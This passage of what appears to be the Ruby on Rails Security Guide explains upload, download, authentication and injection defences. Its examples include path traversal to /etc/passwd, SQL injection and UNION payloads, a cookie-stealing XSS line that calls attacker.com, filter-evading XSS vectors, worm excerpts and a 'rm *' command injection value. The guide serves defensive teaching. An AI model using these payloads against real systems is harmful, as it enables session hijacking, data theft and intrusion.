When filtering user input file names, _don't try to remove malicious parts_. Think of a situation where the web application removes all "../" in a file name and an attacker uses a string such as "....//" - the result will be "../". It is best to use a whitelist approach, which _checks for the validity of a file name with a set of accepted characters_. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the [attachment\_fu plugin](https://github.com/technoweenie/attachment_fu/tree/master):

```ruby
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.sub! /\A.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! /[^\w\.\-]/, '_'
  end
end
```

A significant disadvantage of synchronous processing of file uploads (as the attachment\_fu plugin may do with images), is its _vulnerability to denial-of-service attacks_. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.

The solution to this is best to _process media files asynchronously_: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.

### Executable Code in File Uploads

WARNING: _Source code in uploaded files may be executed when placed in specific directories. Do not place file uploads in Rails' /public directory if it is Apache's home directory._

The popular Apache web server has an option called DocumentRoot. This is the home directory of the web site, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are PHP and CGI files. Now think of a situation where an attacker uploads a file "file.cgi" with code in it, which will be executed when someone downloads the file.

_If your Apache DocumentRoot points to Rails' /public directory, do not put file uploads in it_, store files at least one level downwards.

### File Downloads

NOTE: _Make sure users cannot download arbitrary files._

Just as you have to filter file names for uploads, you have to do so for downloads. The send_file() method sends files from the server to the client. If you use a file name, that the user entered, without filtering, any file can be downloaded:

```ruby
send_file('/var/www/uploads/' + params[:filename])
```

Simply pass a file name like "../../../etc/passwd" to download the server's login information. A simple solution against this, is to _check that the requested file is in the expected directory_:

```ruby
basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename !=
     File.expand_path(File.join(File.dirname(filename), '../../../'))
send_file filename, disposition: 'inline'
```

Another (additional) approach is to store the file names in the database and name the files on the disk after the ids in the database. This is also a good approach to avoid possible code in an uploaded file to be executed. The attachment_fu plugin does this in a similar way.

Intranet and Admin Security
---------------------------

Intranet and administration interfaces are popular attack targets, because they allow privileged access. Although this would require several extra-security measures, the opposite is the case in the real world.

In 2007 there was the first tailor-made trojan which stole information from an Intranet, namely the "Monster for employers" web site of Monster.com, an online recruitment web application. Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. However, the highest threat to Intranet and Admin applications are XSS and CSRF. 

**XSS** If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.

Having one single place in the admin interface or Intranet, where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator's cookie, injecting an iframe to steal the administrator's password or installing malicious software through browser security holes to take over the administrator's computer.

Refer to the Injection section for countermeasures against XSS. It is _recommended to use the SafeErb plugin_ also in an Intranet or administration interface.

**CSRF** Cross-Site Reference Forgery (CSRF) is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.

A real-world example is a [router reconfiguration by CSRF](http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352). The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for them, but it also contained an image tag that resulted in a HTTP-GET request to reconfigure the user's router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker's site. Everyone who accessed the banking site through that router saw the attacker's fake web site and had his credentials stolen.

Another example changed Google Adsense's e-mail address and password by. If the victim was logged into Google Adsense, the administration interface for Google advertisements campaigns, an attacker could change his credentials. 

Another popular attack is to spam your web application, your blog or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application's admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.

For _countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section_.

### Additional Precautions

The common admin interface works like this: it's located at www.example.com/admin, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:

* It is very important to _think about the worst case_: What if someone really got hold of my cookie or user credentials. You could _introduce roles_ for the admin interface to limit the possibilities of the attacker. Or how about _special login credentials_ for the admin interface, other than the ones used for the public part of the application. Or a _special password for very serious actions_?

* Does the admin really have to access the interface from everywhere in the world? Think about _limiting the login to a bunch of source IP addresses_. Examine request.remote_ip to find out about the user's IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.

* _Put the admin interface to a special sub-domain_ such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, www.application.com, impossible. This is because of the same origin policy in your browser: An injected (XSS) script on www.application.com may not read the cookie for admin.application.com and vice-versa.

User Management
---------------

NOTE: _Almost every web application has to deal with authorization and authentication. Instead of rolling your own, it is advisable to use common plug-ins. But keep them up-to-date, too. A few additional precautions can make your application even more secure._

There are a number of authentication plug-ins for Rails available. Good ones, such as the popular [devise](https://github.com/plataformatec/devise) and [authlogic](https://github.com/binarylogic/authlogic), store only encrypted passwords, not plain-text passwords. In Rails 3.1 you can use the built-in `has_secure_password` method which has similar features.

Every new user gets an activation code to activate his account when he gets an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested an URL like these, he would be logged in as the first activated user found in the database (and chances are that this is the administrator):

```
http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=
```

This is possible because on some servers, this way the parameter id, as in params[:id], would be nil. However, here is the finder from the activation action:

```ruby
User.find_by_activation_code(params[:id])
```

If the parameter was nil, the resulting SQL query will be

```sql
SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
```

And thus it found the first user in the database, returned it and logged him in. You can find out more about it in [my blog post](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/). _It is advisable to update your plug-ins from time to time_. Moreover, you can review your application to find more flaws like this.

### Brute-Forcing Accounts

NOTE: _Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with more generic error messages and possibly require to enter a CAPTCHA._

A list of user names for your web application may be misused to brute-force the corresponding passwords, because most people don't use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of user names and a dictionary, an automatic program may find the correct password in a matter of minutes.

Because of this, most web applications will display a generic error message "user name or password not correct", if one of these are not correct. If it said "the user name you entered has not been found", an attacker could automatically compile a list of user names.

However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered user name or e-mail address has (not) been found. This allows an attacker to compile a list of user names and brute-force the accounts.

In order to mitigate such attacks, _display a generic error message on forgot-password pages, too_. Moreover, you can _require to enter a CAPTCHA after a number of failed logins from a certain IP address_. Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.

### Account Hijacking

Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?.

#### Passwords

Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring him to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, _make change-password forms safe against CSRF_, of course. And _require the user to enter the old password when changing it_.

#### E-Mail

However, the attacker may also take over the account by changing the e-mail address. After he changed it, he will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker's e-mail address. As a countermeasure _require the user to enter the password when changing the e-mail address, too_.

#### Other

Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to his e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, _review your application logic and eliminate all XSS and CSRF vulnerabilities_.

### CAPTCHAs

INFO: _A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect comment forms from automatic spam bots by asking the user to type the letters of a distorted image. The idea of a negative CAPTCHA is not for a user to prove that he is human, but reveal that a robot is a robot._

But not only spam robots (bots) are a problem, but also automatic login bots. A popular CAPTCHA API is [reCAPTCHA](http://recaptcha.net/) which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. [ReCAPTCHA](https://github.com/ambethia/recaptcha/) is also a Rails plug-in with the same name as the API.

You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails.
The problem with CAPTCHAs is, they are annoying. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. The idea of negative CAPTCHAs is not to ask a user to proof that he is human, but reveal that a spam robot is a bot.

Most bots are really dumb, they crawl the web and put their spam into every form's field they can find. Negative CAPTCHAs take advantage of that and include a "honeypot" field in the form which will be hidden from the human user by CSS or JavaScript.

Here are some ideas how to hide honeypot fields by JavaScript and/or CSS:

* position the fields off of the visible area of the page
* make the elements very small or color them the same as the background of the page
* leave the fields displayed, but tell humans to leave them blank

The most simple negative CAPTCHA is one hidden honeypot field. On the server side, you will check the value of the field: If it contains any text, it must be a bot. Then, you can either ignore the post or return a positive result, but not saving the post to the database. This way the bot will be satisfied and moves on. You can do this with annoying users, too.

You can find more sophisticated negative CAPTCHAs in Ned Batchelder's [blog post](http://nedbatchelder.com/text/stopbots.html):

* Include a field with the current UTC time-stamp in it and check it on the server. If it is too far in the past, or if it is in the future, the form is invalid.
* Randomize the field names
* Include more than one honeypot field of all types, including submission buttons

Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. So _negative CAPTCHAs might not be good to protect login forms_.

### Logging

WARNING: _Tell Rails not to put passwords in the log files._

By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers et cetera. When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can _filter certain request parameters from your log files_ by appending them to `config.filter_parameters` in the application configuration. These parameters will be marked [FILTERED] in the log.

```ruby
config.filter_parameters << :password
```

### Good Passwords

INFO: _Do you find it hard to remember all your passwords? Don't write them down, but use the initial letters of each word in an easy to remember sentence._

Bruce Schneier, a security technologist, [has analyzed](http://www.schneier.com/blog/archives/2006/12/realworld_passw.html) 34,000 real-world user names and passwords from the MySpace phishing attack mentioned <a href="#examples-from-the-underground">below</a>. It turns out that most of the passwords are quite easy to crack. The 20 most common passwords are:

password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, and monkey.

It is interesting that only 4% of these passwords were dictionary words and the great majority is actually alphanumeric. However, password cracker dictionaries contain a large number of today's passwords, and they try out all kinds of (alphanumerical) combinations. If an attacker knows your user name and you use a weak password, your account will be easily cracked.

A good password is a long alphanumeric combination of mixed cases. As this is quite hard to remember, it is advisable to enter only the _first letters of a sentence that you can easily remember_. For example "The quick brown fox jumps over the lazy dog" will be "Tqbfjotld". Note that this is just an example, you should not use well known phrases like these, as they might appear in cracker dictionaries, too.

### Regular Expressions

INFO: _A common pitfall in Ruby's regular expressions is to match the string's beginning and end by ^ and $, instead of \A and \z._

Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many Ruby and Rails books get this wrong. So how is this a security threat? Say you wanted to loosely validate a URL field and you used a simple regular expression like this:

```ruby
  /^https?:\/\/[^\n]+$/i
```

This may work fine in some languages. However, _in Ruby ^ and $ match the **line** beginning and line end_. And thus a URL like this passes the filter without problems:

```
javascript:exploit_code();/*
http://hi.com
*/
```

This URL passes the filter because the regular expression matches - the second line, the rest does not matter. Now imagine we had a view that showed the URL like this:

```ruby
  link_to "Homepage", @user.homepage
```

The link looks innocent to visitors, but when it's clicked, it will execute the JavaScript function "exploit_code" or any other JavaScript the attacker provides.

To fix the regular expression, \A and \z should be used instead of ^ and $, like so:

```ruby
  /\Ahttps?:\/\/[^\n]+\z/i
```

Since this is a frequent mistake, the format validator (validates_format_of) now raises an exception if the provided regular expression starts with ^ or ends with $. If you do need to use ^ and $ instead of \A and \z (which is rare), you can set the :multiline option to true, like so:

```ruby
  # content should include a line "Meanwhile" anywhere in the string
  validates :content, format: { with: /^Meanwhile$/, multiline: true }
```

Note that this only protects you against the most common mistake when using the format validator - you always need to keep in mind that ^ and $ match the **line** beginning and line end in Ruby, and not the beginning and end of a string.

### Privilege Escalation

WARNING: _Changing a single parameter may give the user unauthorized access. Remember that every parameter may be changed, no matter how much you hide or obfuscate it._

The most common parameter that a user might tamper with, is the id parameter, as in `http://www.domain.com/project/1`, whereas 1 is the id. It will be available in params in the controller. There, you will most likely do something like this:

```ruby
@project = Project.find(params[:id])
```

This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and he is not allowed to see that information, he will have access to it anyway. Instead, _query the user's access rights, too_:

```ruby
@project = @current_user.projects.find(params[:id])
```

Depending on your web application, there will be many more parameters the user can tamper with. As a rule of thumb, _no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated_.

Don't be fooled by security by obfuscation and JavaScript security. The Web Developer Toolbar for Mozilla Firefox lets you review and change every form's hidden fields. _JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values_. The Live Http Headers plugin for Mozilla Firefox logs every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.

Injection
---------

INFO: _Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection._

Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query or programming language, the shell or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.

### Whitelists versus Blacklists

NOTE: _When sanitizing, protecting or verifying something, whitelists over blacklists._

A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. Although sometimes it is not possible to create a whitelist (in a SPAM filter, for example), _prefer to use whitelist approaches_:

* Use before_action only: [...] instead of except: [...]. This way you don't forget to turn it off for newly added actions.
* Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (XSS). See below for details.
* Don't try to correct user input by blacklists:
    * This will make the attack work: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")
    * But reject malformed input

Whitelists are also a good approach against the human factor of forgetting something in the blacklist.

### SQL Injection

INFO: _Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem._

#### Introduction

SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:

```ruby
Project.where("name = '#{params[:name]}'")
```

This could be in a search action and the user may enter a project's name that he wants to find. If a malicious user enters ' OR 1 --, the resulting SQL query will be:

```sql
SELECT * FROM projects WHERE name = '' OR 1 --'
```

The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.

#### Bypassing Authorization

Usually a web application includes access control. The user enters his login credentials, the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.

```ruby
User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

If an attacker enters ' OR '1'='1 as the name, and ' OR '2'>'1 as the password, the resulting SQL query will be:

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

This will simply find the first record in the database, and grants access to this user.

#### Unauthorized Reading

The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let's take the example from above:

```ruby
Project.where("name = '#{params[:name]}'")
```

And now let's inject another query using the UNION statement:

```
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
```

This will result in the following SQL query:

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.

Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails [to at least 2.1.1](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/).

#### Countermeasures

Ruby on Rails has a built-in filter for special SQL characters, which will escape ' , " , NULL character and line breaks. <em class="highlight">Using `Model.find(id)` or `Model.find_by_some thing(something)` automatically applies this countermeasure</em>. But in SQL fragments, especially <em class="highlight">in conditions fragments (`where("...")`), the `connection.execute()` or `Model.find_by_sql()` methods, it has to be applied manually</em>.

Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:

```ruby
Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
```

As you can see, the first part of the array is an SQL fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:

```ruby
Model.where(login: entered_user_name, password: entered_password).first
```

The array or hash form is only available in model instances. You can try `sanitize_sql()` elsewhere. _Make it a habit to think about the security consequences when using an external string in SQL_.

### Cross-Site Scripting (XSS)

INFO: _The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off._

#### Entry Points

An entry point is a vulnerable URL and its parameters where an attacker can start an attack.

The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the [Live HTTP Headers Firefox plugin](http://livehttpheaders.mozdev.org/), or client-site proxies make it easy to change requests.

XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.

During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) also documented 239 browser plug-in vulnerabilities in the last six months of 2007. [Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/) is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high targets.

A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/).

#### HTML/JavaScript Injection

The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. _Escaping user input is essential_.

Here is the most straightforward test to check for XSS:

```html
<script>alert('Hello');</script>
```

This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:

```html
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
```

##### Cookie Theft

These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:

```
<script>document.write(document.cookie);</script>
```

For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victim's cookie.

```html
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

The log files on www.attacker.com will read like this:

```
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
```

You can mitigate these attacks (in the obvious way) by adding the [httpOnly](http://dev.rubyonrails.org/ticket/8895) flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies [will still be visible using Ajax](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/), though.

##### Defacement

With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:

```html
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
```

This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the [Mpack attack framework](http://isc.sans.org/diary.html?storyid=3015). Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.

A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attacker's site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.

Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":

```
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
```

##### Countermeasures

_It is very important to filter malicious input, but it is also important to escape the output of the web application_.

Especially for XSS, it is important to do _whitelist input filtering instead of blacklist_. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.

Imagine a blacklist deletes "script" from the user input. Now the attacker injects "&lt;scrscriptipt&gt;", and after the filter, "&lt;script&gt;" remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

This returned "some&lt;script&gt;alert('hello')&lt;/script&gt;", which makes an attack work. That's why I vote for a whitelist approach, using the updated Rails 2 method sanitize():

```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.

As a second step, _it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). _Use `escapeHTML()` (or its alias `h()`) method_ to replace the HTML input characters &amp;, &quot;, &lt;, &gt; by their uninterpreted representations in HTML (`&amp;`, `&quot;`, `&lt`;, and `&gt;`). However, it can easily happen that the programmer forgets to use it, so _it is recommended to use the [SafeErb](http://safe-erb.rubyforge.org/svn/plugins/safe_erb/) plugin_. SafeErb reminds you to escape strings from external sources.

##### Obfuscation and Encoding Injection

Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:

```
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus "get to know your enemy", is the [Hackvertor](https://hackvertor.co.uk/public). Rails' sanitize() method does a good job to fend off encoding attacks.

#### Examples from the Underground

_In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._

The following is an excerpt from the [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [worm](http://groovin.net/stuff/yammer.txt). It appeared on June 11, 2006 and was the first webmail interface worm:

```
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
```

The worms exploits a hole in Yahoo's HTML/JavaScript filter, which usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.

Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on [Rosario Valotta's paper](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/). Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.

In December 2006, 34,000 actual user names and passwords were stolen in a [MySpace phishing attack](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html). The idea of the attack was to create a profile page named "login_home_index_html", so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.

The MySpace Samy worm will be discussed in the CSS Injection section.

### CSS Injection

INFO: _CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application._

CSS Injection is explained best by a well-known worm, the [MySpace Samy worm](http://namb.la/popular/tech.html). This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. The following is a technical explanation of the worm.

MySpace blocks many tags, however it allows CSS. So the worm's author put JavaScript into CSS like this:

```html
<div style="background:url('javascript:alert(1)')">
```

So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy eval() function which executes any string as code.

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word "innerHTML":

```
alert(eval('document.body.inne' + 'rHTML'));
```

The next problem was MySpace filtering the word "javascript", so the author used "java&lt;NEWLINE&gt;script" to get around this:

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
```

Another problem for the worm's author were CSRF security tokens. Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.

In the end, he got a 4 KB worm, which he injected into his profile page.

The [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).

#### Countermeasures

This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, I am not aware of a whitelist CSS filter. _If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application_. Use Rails' `sanitize()` method as a model for a whitelist CSS filter, if you really need one.

### Textile Injection

If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. [RedCloth](http://redcloth.org/) is such a language for Ruby, but without precautions, it is also vulnerable to XSS.

For example, RedCloth translates `_test_` to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the [all-new version 4](http://www.redcloth.org) that removed serious bugs. However, even that version has [some security bugs](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), so the countermeasures still apply. Here is an example for version 3.0.4:

```ruby
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
```

Use the :filter_html option to remove HTML which was not created by the Textile processor.

```ruby
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```

However, this does not filter all HTML, a few tags will be left (by design), for example &lt;a&gt;:

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### Countermeasures

It is recommended to _use RedCloth in combination with a whitelist input filter_, as described in the countermeasures against XSS section.

### Ajax Injection

NOTE: _The same security precautions have to be taken for Ajax actions as for "normal" ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._

If you use the [in_place_editor plugin](http://dev.rubyonrails.org/browser/plugins/in_place_editing), or actions that return a string, rather than rendering a view, _you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.

### Command Line Injection

NOTE: _Use user-supplied command line parameters with caution._

If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and `command`. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).

A countermeasure is to _use the `system(command, parameters)` method which passes command line parameters safely_.

```ruby
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
```


### Header Injection

